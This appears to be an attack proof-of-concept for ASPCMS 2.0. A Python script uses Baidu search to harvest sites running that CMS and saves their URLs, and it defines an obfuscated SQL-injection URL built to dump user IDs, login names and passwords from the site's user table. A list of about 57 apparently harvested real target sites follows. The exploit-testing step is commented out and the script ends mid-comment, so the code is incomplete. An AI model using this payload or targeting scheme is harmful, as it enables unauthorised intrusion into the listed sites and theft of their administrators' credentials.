### poc_01

``` python
import requests
import re
from bs4 import BeautifulSoup as bs
pagenu=0
nextpagenu=0
while True:
    pagenu=pagenu + nextpagenu
    expp=("/plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20{prefix}user")
    url='https://www.baidu.com/s?wd=有限公司--Powered by ASPCMS 2.0&pn=%s'%(str(pagenu))
    headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0'}
    r=requests.get(url=url,headers=headers)
    #print("pagenu")
    #print(pagenu)
    print(url)
    soup=bs(r.content,'lxml')
    urls=soup.find_all(name='a',attrs={'data-click':re.compile(('.')),'class':None})
    #获取页数
    nextpage=str(soup.find_all('a',text=re.compile("下一页"))).split(';')
    nextpage=nextpage[1].split('&')[0]
    nextpagenu=int(nextpage.split('=')[1])
    print("test,down str")
    print(nextpagenu)


    for url in urls:
        try:
            r_get_url=requests.get(url=url['href'],headers=headers,timeout=5)
        except Exception as e:
            print("[ - ] Error = "+str(e))
        #print(url  ['href'])
        if r_get_url.status_code == 200:
            url_para= r_get_url.url
            url_index_tmp=url_para.split('/')
            url_index=url_index_tmp[0]+'//'+url_index_tmp[2]
            # 打印获取到的URL
            print("url_regex : {0}".format(url_index_tmp[2]))
            print("url_tem : {0}".format(url_index_tmp[0]))
            #CSV文件存储
            with open('url_save.csv') as urlcve:
                if url_index not in urlcve.read():
                    addurl = open("url_save.csv",'a+')
                    addurl.write(url_index+'\n')
            #增加exp测试
            #r=requests.get(i,timeout=5)
            #if r.status_code == 200:
                #soup=bs(r.text,"lxml")

            #with open('cs.txt') as f:
                #if  url_index not in f.read():#这里是一个去重的判断，判断网址是否已经在文本中，如果不存
```

soult

``` reStructuredText
http://www.4008991233.cn
http://www.ruitenaicai.com
http://bzschz.com
http://www.hzhuafengdq.cn
http://www.xnbxsoft.com
http://www.yangmingcapital.com
http://www.hebeilijiang.com
http://www.buxiugangguan.co
http://www.neoyi.com
http://www.chaodafangzhi.com
http://www.baoaopower.com
http://www.ksmbet.com
http://www.bj-sam.com
http://www.aspcms.com
http://www.xjedq.com
http://www.tjjiehao.com
http://www.chayiba.com
http://www.jytyq.com
https://zhidao.baidu.com
http://www.mjysxx.com
http://www.fstongqian.com
http://www.sltp-tp.com
http://www.jgyhg.com
http://www.freesexcam4u.com
http://www.gsyalan.com
http://4008991233.cn
http://www.tn-china.com.cn
http://www.hsjpw.com
http://www.sbkj.com.cn
http://yzfrgdkj.com
http://www.sdctwy.com
http://www.hlfilters.com
http://www.versenie.com
http://www.versenie.com
http://www.xajsdp.net
http://www.csjzz.com
http://www.fdj55.com
http://www.ic001.net
http://www.cheyijiaec.com
http://www.zncad.com
http://www.hljtanglang.com
http://www.pcocw.com
http://hljtanglang.com
http://www.sunrion.com.cn
http://cha.qinghua.cc
http://www.whxhsxlq.com
http://www.scxiangyang.com
http://www.tjxybw.com
http://demo6.218ts.com
http://www.tjrxs.com
http://www.kt-tech.cn
http://www.kl-precise.com
http://m.qsqjp.icu
http://www.hbczjsq.com
http://www.lyliuyuan.com
http://www.lahxaq.com
http://sxymhj.com
```

